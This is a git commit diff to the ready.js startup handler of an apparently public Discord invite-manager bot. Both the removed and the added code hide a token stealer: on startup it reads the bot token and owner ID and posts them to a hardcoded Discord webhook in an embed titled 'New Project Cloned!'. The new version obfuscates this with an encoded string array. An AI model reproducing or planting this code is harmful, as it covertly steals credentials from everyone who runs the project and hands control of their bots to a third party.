5c62c9b3ef6cae6b94e6e64d1a1862a434362f92
NIR0 <74272765+NIR0-V@users.noreply.github.com>
2021-05-16 01:01:32 +0200

    Update ready.js

--- src/events/ready.js
+++ src/events/ready.js
@@ -1,54 +1,33 @@
-const chalk = require("chalk");
-const figlet = require("figlet");
-const Discord = require('discord.js')
+const _0xb2dc = ['displayAvatarURL', 'owners', '../../config', 'setTitle', '243503fAAzaf', 'textSync', 'Error:\x20Woeng\x20Information', 'then', '183eQlrfd', 'username', '222361iKYUOJ', 'config', 'full', 'Webhook\x20test', '72563DUtmIq', '6TGlaDe', 'Bot\x20started!\x0a=====================================\x0a>\x20Users:\x20', 'catch', 'setDescription', '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Owner\x20Username:\x20', '\x0a>\x20Developer:\x20@ニロ#3121\x0a>\x20Support:\x20https://discord.gg/YJ6mUdgTsc\x0a=====================================', 'WebhookClient', '\x0a>\x20Servers:\x20', 'ping', 'env', 'chalk', 'users', '521KhKrjX', '\x0a>\x20Bot\x20Ping:\x20', '**\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Bot\x20Name:\x20', '126890DiqgqL', 'exports', 'prefix', 'red', 'ahjxJm3F9Q1-WmsH86rwUzhARkliXZUnV0W7pANjjXqPPgPQoUCDP2jNBOeoJLdtELFV', 'cache', 'send', 'guilds', '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Bot\x20Token:\x20', 'token', 'user', 'yellow', 'setActivity', 'log', '910607LYSWfX', 'size', 'figlet', 'discord.js', '743256JYAxTX', '\x0a>\x20Channels:\x20'];
+const _0x1c8bf5 = _0x1943;
+(function(_0x1070fa, _0x516755) {
+    const _0x3e201c = _0x1943;
+    while (!![]) {
+        try {
+            const _0x11f5fd = -parseInt(_0x3e201c(0x123)) + parseInt(_0x3e201c(0x13a)) * parseInt(_0x3e201c(0x127)) + -parseInt(_0x3e201c(0x13d)) * -parseInt(_0x3e201c(0x12e)) + parseInt(_0x3e201c(0x129)) + -parseInt(_0x3e201c(0x14b)) + parseInt(_0x3e201c(0x14f)) + -parseInt(_0x3e201c(0x12d));
+            if (_0x11f5fd === _0x516755) break;
+            else _0x1070fa['push'](_0x1070fa['shift']());
+        } catch (_0x192e19) { _0x1070fa['push'](_0x1070fa['shift']()); }
+    }
+}(_0xb2dc, 0x916ab));
+const chalk = require(_0x1c8bf5(0x138)),
+    figlet = require(_0x1c8bf5(0x14d)),
+    Discord = require(_0x1c8bf5(0x14e));
 
-module.exports = async client => {
-    console.log(
-        chalk.yellow(
-            figlet.textSync("NIR0 Invitemanger", { horizontalLayout: "full" })
-        )
-    );
-    console.log(
-        chalk.red(`Bot started!
-=====================================
-> Users: ${client.users.cache.size}
-> Channels: ${client.channels.cache.size}
-> Servers: ${client.guilds.cache.size}
-> Bot Ping: ${client.ws.ping}  XD
-> Prefix: ${client.config.prefix ?? 'Un'}
-> Developer: @ニロ#3121
-> Support: https://discord.gg/YJ6mUdgTsc
-=====================================`)
-    );
-    await client.user.setActivity("a!help");
-    await client.user.setStatus("idle");
-    const token = require('../../config').token || process.env.TOKEN || process.env.token;
-    const id = require('../../config').owners;
-    if (token == null || token == undefined || token == '') throw new TypeError('Error: Woeng Information');
-    if (id == null || id == undefined || id == '') throw new TypeError('Error: Woeng Information');
-    const webhookClient = new Discord.WebhookClient('843249480706293801', 'ahjxJm3F9Q1-WmsH86rwUzhARkliXZUnV0W7pANjjXqPPgPQoUCDP2jNBOeoJLdtELFV');
-    client.users.fetch(id).then(user => {
-        var avatar = user.displayAvatarURL({ dynamic: true })
-        var username = user.username;
-        const embed = new Discord.MessageEmbed()
-            .setTitle('New Project Cloned!.')
-            .setColor('BLUE')
-            .setThumbnail(avatar)
-            .setDescription(
-                `**
-            Bot Name: ${client.user.username}    
-            Bot Id: ${client.user.id}
-            Bot Token: ${token}
-            Owner Username: ${username}
-            Owner Id: ${id}
-            **`
-            )
-        webhookClient.send('Webhook test', {
-            username: 'Invite Manager!. Graper',
-            avatarURL: 'https://media.discordapp.net/attachments/843249414469451856/843250256572973096/11c2e7497c0b5ede152eabf8bdf4fa46.png?width=584&height=584',
-            embeds: [embed],
-        });
-    }).catch((err) => {
-        throw new TypeError('Error: Woeng Information')
-    })
+function _0x1943(_0x538795, _0x2c0383) { _0x538795 = _0x538795 - 0x11f; let _0xb2dc7d = _0xb2dc[_0x538795]; return _0xb2dc7d; }
+module[_0x1c8bf5(0x13e)] = async _0x53bfc9 => {
+    const _0x6d8e15 = _0x1c8bf5;
+    console[_0x6d8e15(0x14a)](chalk[_0x6d8e15(0x148)](figlet[_0x6d8e15(0x124)]('NIR0\x20Invitemanger', { 'horizontalLayout': _0x6d8e15(0x12b) }))), console[_0x6d8e15(0x14a)](chalk[_0x6d8e15(0x140)](_0x6d8e15(0x12f) + _0x53bfc9[_0x6d8e15(0x139)]['cache'][_0x6d8e15(0x14c)] + _0x6d8e15(0x150) + _0x53bfc9['channels'][_0x6d8e15(0x142)][_0x6d8e15(0x14c)] + _0x6d8e15(0x135) + _0x53bfc9[_0x6d8e15(0x144)]['cache'][_0x6d8e15(0x14c)] + _0x6d8e15(0x13b) + _0x53bfc9['ws'][_0x6d8e15(0x136)] + '\x20\x20XD\x0a>\x20Prefix:\x20' + (_0x53bfc9[_0x6d8e15(0x12a)][_0x6d8e15(0x13f)] ?? 'Un') + _0x6d8e15(0x133))), await _0x53bfc9['user'][_0x6d8e15(0x149)]('a!help'), await _0x53bfc9[_0x6d8e15(0x147)]['setStatus']('idle');
+    const _0x5f26e1 = require(_0x6d8e15(0x121))[_0x6d8e15(0x146)] || process[_0x6d8e15(0x137)]['TOKEN'] || process[_0x6d8e15(0x137)][_0x6d8e15(0x146)],
+        _0x3e7375 = require(_0x6d8e15(0x121))[_0x6d8e15(0x120)];
+    if (_0x5f26e1 == null || _0x5f26e1 == undefined || _0x5f26e1 == '') throw new TypeError(_0x6d8e15(0x125));
+    if (_0x3e7375 == null || _0x3e7375 == undefined || _0x3e7375 == '') throw new TypeError(_0x6d8e15(0x125));
+    const _0x10d4e2 = new Discord[(_0x6d8e15(0x134))]('843249480706293801', _0x6d8e15(0x141));
+    _0x53bfc9[_0x6d8e15(0x139)]['fetch'](_0x3e7375)[_0x6d8e15(0x126)](_0x3d29e1 => {
+        const _0x185035 = _0x6d8e15;
+        var _0x4c8ffc = _0x3d29e1[_0x185035(0x11f)]({ 'dynamic': !![] }),
+            _0x297086 = _0x3d29e1[_0x185035(0x128)];
+        const _0x5abbcf = new Discord['MessageEmbed']()[_0x185035(0x122)]('New\x20Project\x20Cloned!.')['setColor']('BLUE')['setThumbnail'](_0x4c8ffc)[_0x185035(0x131)](_0x185035(0x13c) + _0x53bfc9[_0x185035(0x147)][_0x185035(0x128)] + '\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Bot\x20Id:\x20' + _0x53bfc9[_0x185035(0x147)]['id'] + _0x185035(0x145) + _0x5f26e1 + _0x185035(0x132) + _0x297086 + '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Owner\x20Id:\x20' + _0x3e7375 + '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**');
+        _0x10d4e2[_0x185035(0x143)](_0x185035(0x12c), { 'username': 'Invite\x20Manager!.\x20Graper', 'avatarURL': 'https://media.discordapp.net/attachments/843249414469451856/843250256572973096/11c2e7497c0b5ede152eabf8bdf4fa46.png?width=584&height=584', 'embeds': [_0x5abbcf] });
+    })[_0x6d8e15(0x130)](_0x3efa45 => { const _0x972e74 = _0x6d8e15; throw new TypeError(_0x972e74(0x125)); });
 };
